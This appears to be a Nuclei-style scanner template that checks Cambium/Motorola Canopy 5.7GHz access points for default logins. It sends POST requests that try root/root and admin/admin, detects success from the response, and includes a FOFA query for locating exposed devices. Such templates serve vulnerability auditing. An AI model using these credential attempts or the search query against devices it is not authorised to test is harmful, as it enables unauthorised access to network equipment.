http:
- attack: pitchfork
  matchers:
  - part: body
    type: word
    words:
    - Logged in as root
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - root
    - admin
    username:
    - root
    - admin
  raw:
  - 'POST /login.cgi  HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    &Session=0&CanopyUsername={{username}}&CanopyPassword={{password}}&login=Login&webguisubmit=submit

    '
  stop-at-first-match: true
id: cambium-networks-default-login
info:
  author: defektive
  description: 'Cambium Networks / Motorola Canopy 5750AP ADVANTAGE Access Point 5.7GHz
    login credentials were discovered.

    '
  metadata:
    fofa-query: title="Welcome to Canopy"
    max-request: 2
    verified: true
  name: Canopy 5.7GHz Access Point - Default Login
  severity: high
  tags: default-login,cambium,canopy,vuln
